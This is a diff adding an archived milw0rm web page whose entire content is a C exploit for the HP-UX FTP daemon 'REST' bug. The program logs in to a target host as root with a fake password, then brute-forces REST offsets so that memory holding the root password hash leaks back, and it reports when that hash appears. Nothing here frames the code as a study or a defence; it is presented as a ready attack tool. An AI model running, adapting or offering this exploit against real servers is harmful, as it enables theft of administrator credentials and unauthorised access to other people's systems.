@@ -1,0 +1,104 @@
+<html>
+<head>
+<title>HP-UX FTPD <= 1.1.214.4 "REST" Remote Brute Force Exploit</title>
+<pre>
+/* 
+Author: phased
+
+/str0ke
+*/
+
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main (int argc, char *argv[]) {
+
+  int sock, rc;
+  long int i;
+  struct sockaddr_in saddr;
+  struct hostent *h;
+  char buf[256];
+
+  printf(&quot;DMhpux FTPd - REST bug brute forcer\n&quot;);
+  printf(&quot;by phased\n&quot;);
+
+  if(argc &lt; 2) {
+    printf(&quot;usage: %s &lt;host&gt; -- simple enough?\n&quot;,argv[0]);
+    exit(1);
+  }
+  h = gethostbyname(argv[1]);
+  if(h==NULL) {
+    printf(&quot;%s: unknown host '%s'\n&quot;,argv[0],argv[1]);
+    exit(1);
+  }
+
+  saddr.sin_family = h-&gt;h_addrtype;
+  memcpy((char *) &amp;saddr.sin_addr.s_addr, h-&gt;h_addr_list[0], h-&gt;h_length);
+  saddr.sin_port = htons(21);
+
+  sock = socket(AF_INET, SOCK_STREAM, 0);
+  if(sock&lt;0) {
+    perror(&quot;cannot open socket &quot;);
+    exit(1);
+  }
+
+  rc = connect(sock, (struct sockaddr *) &amp;saddr, sizeof(saddr));
+  if(rc&lt;0) {
+    perror(&quot;cannot connect &quot;);
+    exit(1);
+  }
+
+  printf(&quot;Sending false login credentials\n&quot;);
+ snprintf(buf, sizeof(buf), &quot;USER root\r\n&quot;);
+  printf(&quot;sending %s\n&quot;, buf);
+  rc = send(sock, buf, strlen(buf), 0);
+  if(rc&lt;0) {
+        perror(&quot;cannot send data &quot;);
+        close(sock);
+        exit(0);
+  }
+  dorecv(sock);
+	usleep(1000);
+  memset(buf, 0, sizeof(buf));
+  snprintf(buf, sizeof(buf), &quot;PASS foo\r\n&quot;);
+  printf(&quot;sending %s\n&quot;, buf);
+  rc = send(sock, buf, strlen(buf), 0);
+usleep(1000);
+  dorecv(sock);
+  dorecv(sock);
+
+  for(i=1073931080;i&lt;=1073945000;i = i+10) {
+        snprintf(buf, sizeof(buf), &quot;REST %d\r\n&quot;, i);
+        printf(&quot;sending %s\n&quot;, buf);
+        send(sock, buf, strlen(buf), 0);
+        dorecv(sock);
+ }
+
+
+return 0;
+
+}
+
+int dorecv(int sock) {
+char buf[256];
+char *check;
+
+memset(buf, 0, sizeof(buf));
+recv(sock, buf, sizeof(buf), 0);
+printf(&quot;got: %s\n&quot;, buf);
+check = (char *)strstr(buf, &quot;root&quot;);
+if(check != NULL) {
+        printf(&quot;Got root hash\n&quot;);
+}
+
+}
+
+// milw0rm.com [2005-05-03]
+</pre>
+</html>
+
